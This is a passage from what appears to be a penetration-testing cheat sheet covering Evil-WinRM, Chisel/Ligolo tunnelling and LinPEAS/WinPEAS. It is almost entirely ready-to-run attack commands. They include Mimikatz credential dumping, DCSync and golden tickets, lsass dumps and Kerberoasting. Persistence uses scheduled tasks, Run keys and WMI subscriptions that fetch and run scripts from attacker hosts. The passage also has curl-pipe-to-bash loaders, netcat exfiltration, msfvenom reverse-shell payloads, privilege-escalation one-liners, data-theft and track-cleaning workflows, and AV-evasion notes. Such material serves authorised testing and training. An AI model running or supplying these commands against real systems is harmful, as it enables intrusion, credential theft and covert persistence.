*Evil-WinRM* PS C:\> Find-DomainShare -CheckShareAccess
```

**BloodHound data collection:**

```bash
# Load SharpHound
*Evil-WinRM* PS C:\> upload /opt/windows-binaries/SharpHound.exe C:\Windows\Temp\SharpHound.exe

# Run SharpHound
*Evil-WinRM* PS C:\> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> .\SharpHound.exe -c All

# Download results
*Evil-WinRM* PS C:\Windows\Temp> download C:\Windows\Temp\20240101120000_BloodHound.zip /root/bloodhound/

# Alternative: In-memory SharpHound
*Evil-WinRM* PS C:\> Invoke-Binary SharpHound.exe "-c All --outputdirectory C:\Windows\Temp"
```

### Credential Harvesting

**Mimikatz execution:**

```bash
# Load Invoke-Mimikatz
*Evil-WinRM* PS C:\> Invoke-Mimikatz.ps1

# Dump credentials
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump SAM
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"lsadump::sam"'

# DCSync attack
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\krbtgt"'

# Golden ticket
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /id:500"'
```

**Alternative credential dumping:**

```bash
# Using built-in tools
*Evil-WinRM* PS C:\> reg save HKLM\SAM C:\Windows\Temp\sam.hive
*Evil-WinRM* PS C:\> reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
*Evil-WinRM* PS C:\> download C:\Windows\Temp\sam.hive
*Evil-WinRM* PS C:\> download C:\Windows\Temp\system.hive

# On attacker machine
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Process memory dump (lsass)
*Evil-WinRM* PS C:\> Get-Process lsass | Out-Minidump -DumpFilePath C:\Windows\Temp\

# Task Manager method
*Evil-WinRM* PS C:\> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
*Evil-WinRM* PS C:\> download C:\Windows\Temp\lsass.dmp
```

### Kerberoasting

**Rubeus execution:**

```bash
# Invoke-Binary for Rubeus
*Evil-WinRM* PS C:\> Invoke-Binary Rubeus.exe "kerberoast /format:hashcat /outfile:C:\Windows\Temp\hashes.txt"

# Download hashes
*Evil-WinRM* PS C:\> download C:\Windows\Temp\hashes.txt

# Crack on attacker machine
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**PowerShell Kerberoasting:**

```bash
# Request TGS tickets
*Evil-WinRM* PS C:\> Add-Type -AssemblyName System.IdentityModel
*Evil-WinRM* PS C:\> $users = Get-NetUser -SPN
*Evil-WinRM* PS C:\> foreach ($user in $users) {New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $user.serviceprincipalname}

# Export tickets
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### Persistence Mechanisms

**Create scheduled task:**

```bash
# PowerShell reverse shell scheduled task
*Evil-WinRM* PS C:\> $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')`""
*Evil-WinRM* PS C:\> $trigger = New-ScheduledTaskTrigger -Daily -At 9am
*Evil-WinRM* PS C:\> Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
```

**Create service:**

```bash
# Backdoor service
*Evil-WinRM* PS C:\> upload /root/payload.exe C:\Windows\Temp\service.exe
*Evil-WinRM* PS C:\> New-Service -Name "WindowsHelper" -BinaryPathName "C:\Windows\Temp\service.exe" -StartupType Automatic
*Evil-WinRM* PS C:\> Start-Service -Name "WindowsHelper"
```

**Registry persistence:**

```bash
# Run key persistence
*Evil-WinRM* PS C:\> Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell.exe -NoP -W Hidden -Exec Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/beacon.ps1')`""

# Verify
*Evil-WinRM* PS C:\> Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

**WMI event subscription:**

```bash
# Create WMI backdoor
*Evil-WinRM* PS C:\> $FilterArgs = @{name='WindowsUpdate'; EventNameSpace='root\CimV2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
*Evil-WinRM* PS C:\> $Filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property $FilterArgs

*Evil-WinRM* PS C:\> $ConsumerArgs = @{name='WindowsUpdate'; CommandLineTemplate="powershell.exe -NoP -W Hidden -Exec Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')`""}
*Evil-WinRM* PS C:\> $Consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

*Evil-WinRM* PS C:\> $FilterToConsumerArgs = @{Filter = [Ref]$Filter; Consumer = [Ref]$Consumer}
*Evil-WinRM* PS C:\> New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

### Lateral Movement

**PSExec-like execution:**

```bash
# Create service on remote machine
*Evil-WinRM* PS C:\> Invoke-Command -ComputerName TARGET-PC -ScriptBlock {
    New-Service -Name "Deploy" -BinaryPathName "cmd.exe /c powershell -Command `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')`""
    Start-Service -Name "Deploy"
}

# Clean up
*Evil-WinRM* PS C:\> Invoke-Command -ComputerName TARGET-PC -ScriptBlock {Stop-Service -Name "Deploy"; Remove-Service -Name "Deploy"}
```

**Pass-the-Hash lateral movement:**

```bash
# From Evil-WinRM session, connect to another system
*Evil-WinRM* PS C:\> $SecPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force
*Evil-WinRM* PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $SecPassword)
*Evil-WinRM* PS C:\> Invoke-Command -ComputerName TARGET-PC -Credential $Cred -ScriptBlock {whoami}

# Alternatively, exit and connect to new target with discovered hash
# Exit current session
*Evil-WinRM* PS C:\> exit

# Connect to new target
evil-winrm -i 192.168.1.20 -u administrator -H 'DISCOVERED_NTLM_HASH'
```

### File Transfer Optimization

**Large file transfers:**

```bash
# Upload with compression
*Evil-WinRM* PS C:\> upload /root/large_file.zip C:\Windows\Temp\

# Download with compression
*Evil-WinRM* PS C:\> Compress-Archive -Path C:\Sensitive\* -DestinationPath C:\Windows\Temp\loot.zip
*Evil-WinRM* PS C:\> download C:\Windows\Temp\loot.zip /root/loot/
```

**Alternative transfer methods:**

```bash
# SMB share
*Evil-WinRM* PS C:\> net use \\10.10.14.5\share /user:attacker password
*Evil-WinRM* PS C:\> copy C:\Sensitive\file.txt \\10.10.14.5\share\

# Base64 encoding for small files
*Evil-WinRM* PS C:\> $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.txt"))
*Evil-WinRM* PS C:\> $content

# On attacker, decode
echo "BASE64_STRING" | base64 -d > file.txt
```

### Practical Workflows

**Initial access workflow:**

```bash
# Step 1: Connect with credentials
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123' -s /opt/scripts/ -e /opt/binaries/

# Step 2: Bypass AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Step 3: System information
*Evil-WinRM* PS C:\> systeminfo
*Evil-WinRM* PS C:\> whoami /all
*Evil-WinRM* PS C:\> hostname

# Step 4: Network enumeration
*Evil-WinRM* PS C:\> ipconfig /all
*Evil-WinRM* PS C:\> route print
*Evil-WinRM* PS C:\> netstat -ano

# Step 5: Privilege check
*Evil-WinRM* PS C:\> whoami /priv
*Evil-WinRM* PS C:\> net user administrator
*Evil-WinRM* PS C:\> net localgroup administrators
```

**Domain compromise workflow:**

```bash
# Step 1: Load enumeration tools
*Evil-WinRM* PS C:\> Invoke-PowerView.ps1

# Step 2: Domain recon
*Evil-WinRM* PS C:\> Get-Domain
*Evil-WinRM* PS C:\> Get-DomainController
*Evil-WinRM* PS C:\> Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Step 3: Kerberoasting
*Evil-WinRM* PS C:\> Invoke-Binary Rubeus.exe "kerberoast /outfile:C:\Windows\Temp\kerberoast.txt"
*Evil-WinRM* PS C:\> download C:\Windows\Temp\kerberoast.txt

# Step 4: Credential dumping
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Step 5: Lateral movement with harvested credentials
evil-winrm -i 192.168.1.20 -u 'DOMAIN\dadmin' -H 'HARVESTED_HASH'
```

**Data exfiltration workflow:**

```bash
# Step 1: Identify sensitive data
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\ -Include *.pdf,*.doc,*.xlsx,*.txt -Recurse -ErrorAction SilentlyContinue

# Step 2: Search for keywords
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.doc,*.xlsx | Select-String -Pattern "password","confidential","secret"

# Step 3: Compress findings
*Evil-WinRM* PS C:\> Compress-Archive -Path C:\Users\Admin\Documents\Sensitive -DestinationPath C:\Windows\Temp\data.zip

# Step 4: Exfiltrate
*Evil-WinRM* PS C:\> download C:\Windows\Temp\data.zip /root/exfil/

# Step 5: Clean tracks
*Evil-WinRM* PS C:\> Remove-Item C:\Windows\Temp\data.zip -Force
```

### Troubleshooting

**Connection issues:**

```bash
# Verify WinRM is enabled on target
nmap -p 5985,5986 192.168.1.10

# Test WinRM connectivity
Test-WSMan -ComputerName 192.168.1.10

# Enable WinRM (if you have access)
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *

# Check firewall rules
netsh advfirewall firewall show rule name="Windows Remote Management (HTTP-In)"
```

**Authentication errors:**

```bash
# NTLM authentication issues
# Ensure hash format is correct: LM:NTLM or just NTLM
evil-winrm -i 192.168.1.10 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH'

# Domain authentication format
evil-winrm -i 192.168.1.10 -u 'DOMAIN.LOCAL\user' -p 'password'
evil-winrm -i 192.168.1.10 -u 'user@domain.local' -p 'password'

# Certificate issues with SSL
evil-winrm -i 192.168.1.10 -u administrator -p 'password' -S -N
```

**Performance optimization:**

```bash
# Increase timeout for slow connections
evil-winrm -i 192.168.1.10 -u administrator -p 'password' -t 60

# Reduce verbosity
evil-winrm -i 192.168.1.10 -u administrator -p 'password' -q
```

---

## Chisel/Ligolo (Revisited with Integration Focus)

### Overview

Previously covered in Lateral Movement module. This section focuses on integration with Evil-WinRM and practical deployment scenarios specific to Windows environments.

### Chisel with Evil-WinRM

**Deploy Chisel via Evil-WinRM:**

```bash
# Step 1: Upload Chisel Windows binary
*Evil-WinRM* PS C:\> upload /opt/chisel/chisel_windows_amd64.exe C:\Windows\Temp\chisel.exe

# Step 2: Start Chisel server on attacker
chisel server -p 8000 --reverse

# Step 3: Connect from Windows target
*Evil-WinRM* PS C:\> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> .\chisel.exe client ATTACKER_IP:8000 R:socks

# Step 4: Configure proxychains on attacker
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Step 5: Access internal network
proxychains4 evil-winrm -i 172.16.0.10 -u administrator -p 'password'
```

**Chisel for double-hop scenarios:**

```bash
# Topology: Attacker â†’ DMZ (Windows) â†’ Internal (Windows)

# On attacker
chisel server -p 8000 --reverse

# On DMZ Windows (via Evil-WinRM)
*Evil-WinRM* PS C:\> upload /opt/chisel/chisel_windows_amd64.exe C:\Windows\Temp\chisel.exe
*Evil-WinRM* PS C:\> Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\chisel.exe" -ArgumentList "client ATTACKER_IP:8000 R:socks"

# Access internal network from attacker
proxychains4 nmap -sT 172.16.0.0/24
proxychains4 evil-winrm -i 172.16.0.50 -u administrator -H 'HASH'
```

**Persistent Chisel tunnel:**

```bash
# Create scheduled task for Chisel
*Evil-WinRM* PS C:\> upload /opt/chisel/chisel_windows_amd64.exe C:\Windows\System32\chisel.exe

*Evil-WinRM* PS C:\> $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\chisel.exe" -Argument "client ATTACKER_IP:8000 R:socks"
*Evil-WinRM* PS C:\> $trigger = New-ScheduledTaskTrigger -AtStartup
*Evil-WinRM* PS C:\> Register-ScheduledTask -TaskName "SystemChisel" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
```

### Ligolo-ng with Evil-WinRM

**Deploy Ligolo agent via Evil-WinRM:**

```bash
# Step 1: Start Ligolo proxy on attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert

# Step 2: Upload agent to Windows target
*Evil-WinRM* PS C:\> upload /opt/ligolo-ng/agent.exe C:\Windows\Temp\agent.exe

# Step 3: Execute agent
*Evil-WinRM* PS C:\> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> Start-Process -NoNewWindow -FilePath ".\agent.exe" -ArgumentList "-connect ATTACKER_IP:11601 -ignore-cert"

# Step 4: In Ligolo proxy interface
ligolo-ng Â» session
? Specify a session: 1
[Agent : hostname] Â» ifconfig
[Agent : hostname] Â» start

# Step 5: Add route on attacker
sudo ip route add 172.16.0.0/24 dev ligolo

# Step 6: Direct access to internal network
evil-winrm -i 172.16.0.10 -u administrator -p 'password'
nmap -sS 172.16.0.0/24
```

**Ligolo port forwarding for RDP:**

```bash
# In Ligolo session
[Agent : hostname] Â» listener_add --addr 0.0.0.0:3389 --to 172.16.0.10:3389

# On attacker
rdesktop localhost:3389
xfreerdp /u:administrator /p:password /v:localhost:3389
```

### Combined Tunneling Strategies

**Scenario: External â†’ DMZ Windows â†’ Internal Windows Network**

```bash
# Method 1: Evil-WinRM â†’ Ligolo â†’ Internal
# Step 1: Connect to DMZ
evil-winrm -i 10.10.10.50 -u administrator -p 'password'

# Step 2: Deploy Ligolo
*Evil-WinRM* PS C:\> upload agent.exe C:\Windows\Temp\agent.exe
*Evil-WinRM* PS C:\Windows\Temp> .\agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# Step 3: Route and access
sudo ip route add 172.16.0.0/24 dev ligolo
evil-winrm -i 172.16.0.10 -u administrator -H 'HASH'

# Method 2: Chisel SOCKS chain
# DMZ server
*Evil-WinRM* PS C:\> .\chisel.exe client ATTACKER_IP:8000 R:9050:socks

# Access through SOCKS proxy
proxychains4 evil-winrm -i 172.16.0.10 -u administrator -p 'password'
```

**Port forwarding through Evil-WinRM + Chisel:**
```bash
# Forward internal RDP through DMZ
*Evil-WinRM* PS C:\> upload chisel.exe C:\Windows\Temp\chisel.exe
*Evil-WinRM* PS C:\> Start-Process -NoNewWindow -FilePath "C:\Windows\Temp\chisel.exe" -ArgumentList "client ATTACKER_IP:8000 R:3389:172.16.0.10:3389"

# On attacker (Chisel server running)
# RDP directly to localhost
xfreerdp /u:administrator /p:password /v:localhost:3389
```

---

## LinPEAS/WinPEAS

### Overview

PEAS (Privilege Escalation Awesome Scripts) automate enumeration for privilege escalation vectors on Linux (LinPEAS) and Windows (WinPEAS) systems. Identify misconfigurations, vulnerable services, and privilege escalation paths.

---

## LinPEAS

### Installation and Deployment

**Download LinPEAS:**
```bash
# Latest version
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Specific version
wget https://github.com/carlospolop/PEASS-ng/releases/download/20240101/linpeas.sh

# Make executable
chmod +x linpeas.sh

# Fat version (includes full enumeration)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_fat.sh
```

**Transfer methods:**
```bash
# HTTP server on attacker
python3 -m http.server 8000

# On target - download and execute
curl http://ATTACKER_IP:8000/linpeas.sh | bash
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh

# Direct execution without writing to disk
curl http://ATTACKER_IP:8000/linpeas.sh | bash

# Base64 encoding (no wget/curl)
# On attacker
base64 -w 0 linpeas.sh > linpeas_b64.txt

# On target
echo "BASE64_CONTENT" | base64 -d | bash

# SCP transfer
scp linpeas.sh user@target:/tmp/

# Via Evil-WinRM to Linux target through Windows pivot
# (Upload to Windows, then use Windows to transfer)
```

**Run from memory:**
```bash
# Direct execution via curl
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Using bash process substitution
bash <(curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)
```

### Basic Execution

**Standard execution:**
```bash
# Basic run
./linpeas.sh

# With output redirection
./linpeas.sh > linpeas_output.txt

# Both stdout and stderr
./linpeas.sh 2>&1 | tee linpeas_output.txt

# Quiet mode (less output)
./linpeas.sh -q

# Verbose mode
./linpeas.sh -v
```

**Output options:**
```bash
# No colors (for file output)
./linpeas.sh -o no_colors

# Only specific checks
./linpeas.sh -a

# Fast mode (skip time-consuming checks)
./linpeas.sh -f

# SuperFast mode (minimal checks)
./linpeas.sh -s
```

### Search Parameters

**Filter specific checks:**
```bash
# Search for specific keyword
./linpeas.sh -s password

# Multiple keywords
./linpeas.sh -s "password,config,key"

# Regular expression search
./linpeas.sh -r "pass.*"

# Look for SUID binaries only
./linpeas.sh | grep -A 10 "SUID"

# Find writable files
./linpeas.sh | grep -A 10 "Writable"
```

**Level-based execution:**
```bash
# Level 0: Fast scan (minimal checks)
./linpeas.sh -L 0

# Level 1: Normal scan (default)
./linpeas.sh -L 1

# Level 2: Thorough scan
./linpeas.sh -L 2

# Full enumeration
./linpeas.sh -a
```

### Output Interpretation

**Color coding:**
```
RED/YELLOW: 95% chance of privilege escalation
RED: Should be investigated
LIGHT_YELLOW: Interesting finding
LIGHT_MAGENTA: Possible credential
GREEN: Common finding, less likely exploitable
BLUE: Additional information
```

**Key sections to review:**

**1. System Information:**
```bash
# OS version and kernel
# Check for kernel exploits
uname -a
cat /etc/os-release

# Look for Dirty COW, overlayfs, etc. vulnerabilities
```

**2. SUID Binaries:**
```bash
# LinPEAS highlights unusual SUID binaries
# Cross-reference with GTFOBins
# Example output:
# -rwsr-xr-x 1 root root 8392 Sep  1  2020 /usr/bin/find

# Exploit find SUID
find . -exec /bin/bash -p \;
```

**3. Sudo Configuration:**
```bash
# Sudo permissions
# Look for NOPASSWD entries
# Check for vulnerable sudo versions (CVE-2021-3156)

# Example finding:
# User can run: (ALL) NOPASSWD: /usr/bin/vim

# Exploit
sudo vim -c ':!/bin/sh'
```

**4. Writable Paths:**
```bash
# Writable files and directories
# PATH hijacking opportunities
# Writable systemd services
# Cron job scripts

# Example: Writable PATH directory
echo "/bin/bash" > /writable/path/vulnerable_binary
chmod +x /writable/path/vulnerable_binary
```

**5. Credentials:**
```bash
# Database credentials
# Configuration files with passwords
# History files
# SSH keys

# Common locations highlighted:
# /var/www/html/config.php
# ~/.bash_history
# ~/.ssh/id_rsa
```

**6. Running Processes:**
```bash
# Processes running as root
# Vulnerable applications
# Interesting ports

# Example: MySQL running as root
# Exploit with UDF
```

**7. Network Information:**
```bash
# Open ports
# Internal networks
# Firewall rules

# Pivot opportunities identified
```

### Practical Usage Examples

**CTF/Lab scenario:**
```bash
# Step 1: Upload and execute
wget http://10.10.14.5/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Step 2: Review critical findings
cat linpeas_output.txt | grep -E "95%|RED|YELLOW" -A 5

# Step 3: Focus on specific vector
# If SUID binary found
/usr/bin/pkexec --version  # Check for CVE-2021-4034
/usr/bin/find . -exec /bin/sh -p \; -quit

# If sudo misconfiguration
sudo -l
sudo /vulnerable/binary

# If kernel exploit
searchsploit linux kernel 5.4.0
```

**Real-world engagement:**
```bash
# Stealthy execution (minimal footprint)
curl -s http://ATTACKER_IP/linpeas.sh | bash > /dev/null 2>&1 &

# Save output to attacker machine
./linpeas.sh | nc ATTACKER_IP 4444

# On attacker
nc -lvnp 4444 > linpeas_output.txt
```

**Automation integration:**
```bash
# Automated exploitation framework
#!/bin/bash
# Upload linpeas
scp linpeas.sh user@target:/tmp/

# Execute and retrieve
ssh user@target "/tmp/linpeas.sh" > results/$(date +%Y%m%d)_linpeas.txt

# Parse for critical findings
grep -E "95%|CVE" results/*_linpeas.txt
```

### LinPEAS Alternative Modes

**Binary version (compiled):**
```bash
# Download precompiled binary
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64

# Execute
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64

# ARM architecture
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_arm
```

**Docker container enumeration:**
```bash
# If inside Docker container, LinPEAS detects
# Look for:
# - Docker socket (/var/run/docker.sock)
# - Kubernetes service account tokens
# - Container escape vulnerabilities

# Docker socket exploitation
docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs bash
```

---

## WinPEAS

### Installation and Deployment

**Download WinPEAS:**
```bash
# On attacker machine
# .exe (compiled executable)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe  # Any CPU

# .bat (batch script version)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat

# Obfuscated version (AV evasion)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64_ofs.exe
```

**Transfer to Windows target:**
```bash
# Via Evil-WinRM
*Evil-WinRM* PS C:\> upload /opt/winPEASx64.exe C:\Windows\Temp\winpeas.exe

# Via HTTP
# On attacker
python3 -m http.server 8000

# On target (PowerShell)
Invoke-WebRequest -Uri http://ATTACKER_IP:8000/winPEASx64.exe -OutFile C:\Windows\Temp\winpeas.exe
certutil -urlcache -f http://ATTACKER_IP:8000/winPEASx64.exe C:\Windows\Temp\winpeas.exe

# Via SMB
# On attacker
impacket-smbserver share /opt/winpeas -smb2support

# On target
copy \\ATTACKER_IP\share\winPEASx64.exe C:\Windows\Temp\winpeas.exe

# Base64 transfer (small files)
# On attacker
base64 -w 0 winPEASx64.exe > winpeas_b64.txt

# On target (PowerShell)
$b64 = "BASE64_CONTENT"
[IO.File]::WriteAllBytes("C:\Windows\Temp\winpeas.exe", [Convert]::FromBase64String($b64))
```

**In-memory execution (avoid disk writes):**
```bash
# PowerShell download and execute
*Evil-WinRM* PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/winPEAS.bat')

# Reflective PE injection (advanced)
# Requires PowerShell wrapper for .exe
*Evil-WinRM* PS C:\> $data = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP:8000/winPEASx64.exe')
*Evil-WinRM* PS C:\> [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, $null)
```

### Basic Execution

**Standard execution:**
```bash
# Via Evil-WinRM or RDP
*Evil-WinRM* PS C:\Windows\Temp> .\winpeas.exe

# With output redirection
*Evil-WinRM* PS C:\> .\winpeas.exe > output.txt

# Batch version
*Evil-WinRM* PS C:\> .\winPEAS.bat

# Specific checks only
*Evil-WinRM* PS C:\> .\winpeas.exe fast

# All checks
*Evil-WinRM* PS C:\> .\winpeas.exe all
```

**Command-line options:**
```bash
# Display help
.\winpeas.exe help

# Fast scan (reduced checks)
.\winpeas.exe fast

# Full scan
.\winpeas.exe all

# Specific categories
.\winpeas.exe systeminfo
.\winpeas.exe userinfo
.\winpeas.exe processinfo
.\winpeas.exe servicesinfo
.\winpeas.exe applicationsinfo
.\winpeas.exe networkinfo
.\winpeas.exe windowscreds
.\winpeas.exe filesinfo

# Quiet mode (less output)
.\winpeas.exe quiet

# No color output
.\winpeas.exe cmd
```

**Output formatting:**
```bash
# Text output
.\winpeas.exe > winpeas_output.txt

# HTML output
.\winpeas.exe htmloutput

# Download to attacker via Evil-WinRM
*Evil-WinRM* PS C:\> .\winpeas.exe > C:\Windows\Temp\output.txt
*Evil-WinRM* PS C:\> download C:\Windows\Temp\output.txt /root/winpeas_results.txt
```

### Key Enumeration Areas

**1. System Information:**
```
- OS Version and Architecture
- Hostname and Domain
- Current User and Privileges
- PowerShell versions
- Antivirus products
- Windows Defender status
- UAC settings
```

**2. User Information:**
```
- Current user details
- User privileges (whoami /all equivalent)
- Local users and groups
- Recently accessed files
- Clipboard contents
- Saved RDP connections
```

**3. Process Information:**
```
- Running processes (especially as SYSTEM)
- Process permissions
- Unquoted service paths
- DLL hijacking opportunities
```

**4. Service Information:**
```
- Modifiable services
- Service binary permissions
- Unquoted service paths
- Service restart permissions
- PATH DLL hijacking
```

**5. Registry Analysis:**
```
- Always Install Elevated
- AutoLogon credentials
- Stored credentials
- SNMP community strings
- Putty sessions
- VNC passwords
```

**6. Scheduled Tasks:**
```
- Modifiable scheduled tasks
- Tasks running as SYSTEM
- Writable task scripts
```

**7. Network Configuration:**
```
- Network interfaces
- Open ports
- Firewall rules
- Active connections
- Network shares
- Wi-Fi profiles
```

**8. Credentials:**
```
- Credentials in registry
- Credentials in files
- Unattend.xml files
- Web.config files
- PowerShell history
- IIS application pools
```

**9. File System:**
```
- Writable directories
- Interesting files
- Recent documents
- Downloaded files
- Backup files
```

**10. Windows Exploits:**
```
- Missing patches
- Known vulnerabilities (CVEs)
- Kernel exploit suggestions
```

### Output Interpretation

**Critical findings (Red/Yellow):**

**AlwaysInstallElevated:**
```powershell
# If both registry keys are set to 1
# HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
# HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Exploit: Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o exploit.msi

# Upload and install
*Evil-WinRM* PS C:\> upload exploit.msi C:\Windows\Temp\exploit.msi
*Evil-WinRM* PS C:\> msiexec /quiet /qn /i C:\Windows\Temp\exploit.msi
```

**Unquoted Service Paths:**
```powershell
# Example finding:
# C:\Program Files\Vulnerable Service\service.exe

# Exploit: Place malicious executable
*Evil-WinRM* PS C:\> copy C:\Windows\Temp\payload.exe "C:\Program Files\Vulnerable.exe"
*Evil-WinRM* PS C:\> Restart-Service "VulnerableService"
```

**Modifiable Service Binary:**
```powershell
# Service binary is writable by current user

# Replace with malicious binary
*Evil-WinRM* PS C:\> upload payload.exe C:\Path\To\Service\binary.exe
*Evil-WinRM* PS C:\> Restart-Service ServiceName
```

**SeImpersonatePrivilege enabled:**
```powershell
# Indicates potato exploits applicable
# JuicyPotato, RoguePotato, PrintSpoofer

# Upload and execute PrintSpoofer
*Evil-WinRM* PS C:\> upload PrintSpoofer.exe C:\Windows\Temp\ps.exe
*Evil-WinRM* PS C:\> C:\Windows\Temp\ps.exe -i -c cmd
```

**AutoLogon Credentials:**
```powershell
# Found in registry:
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

# Extract credentials
*Evil-WinRM* PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select DefaultUserName,DefaultPassword
```

### Practical Workflows

**Initial enumeration workflow:**
```bash
# Step 1: Upload WinPEAS via Evil-WinRM
evil-winrm -i 192.168.1.10 -u user -p 'password'
*Evil-WinRM* PS C:\> upload /opt/winPEASx64.exe C:\Windows\Temp\wp.exe

# Step 2: Execute with output
*Evil-WinRM* PS C:\> C:\Windows\Temp\wp.exe > C:\Windows\Temp\output.txt

# Step 3: Download results
*Evil-WinRM* PS C:\> download C:\Windows\Temp\output.txt /root/winpeas_output.txt

# Step 4: Analyze locally
cat /root/winpeas_output.txt | grep -E "95%|Password|Vuln" -A 5
```

**Quick privilege escalation check:**
```bash
# Fast mode for quick wins
*Evil-WinRM* PS C:\> .\winpeas.exe fast | Select-String -Pattern "Token","Privilege","Password"

# Focus on high-value targets
*Evil-WinRM* PS C:\> .\winpeas.exe servicesinfo | Select-String -Pattern "Modifiable","Unquoted"
```

**Credential harvesting workflow:**
```bash
# Step 1: Run credentials-focused scan
*Evil-WinRM* PS C:\> .\winpeas.exe windowscreds > creds.txt

# Step 2: Search specific locations
*Evil-WinRM* PS C:\> Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.txt,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern "password","pwd","connectionString"

# Step 3: Check PowerShell history
*Evil-WinRM* PS C:\> Get-Content (Get-PSReadlineOption).HistorySavePath

# Step 4: Extract saved credentials
*Evil-WinRM* PS C:\> cmdkey /list
*Evil-WinRM* PS C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Service exploitation workflow:**
```bash
# Step 1: Identify vulnerable services
*Evil-WinRM* PS C:\> .\winpeas.exe servicesinfo | Select-String "Modifiable" -Context 5

# Step 2: Create payload
# On attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o service.exe

# Step 3: Replace service binary
*Evil-WinRM* PS C:\> upload service.exe C:\Path\To\Vulnerable\service.exe

# Step 4: Setup listener
nc -lvnp 4444

# Step 5: Restart service
*Evil-WinRM* PS C:\> Restart-Service VulnerableService
```

### AV Evasion

**Obfuscated version:**
```bash
# Use obfuscated version
*Evil-WinRM* PS C:\> upload winPEASx64_ofs.exe C:\Windows\Temp\wp.exe

# Check Windows Defender status first
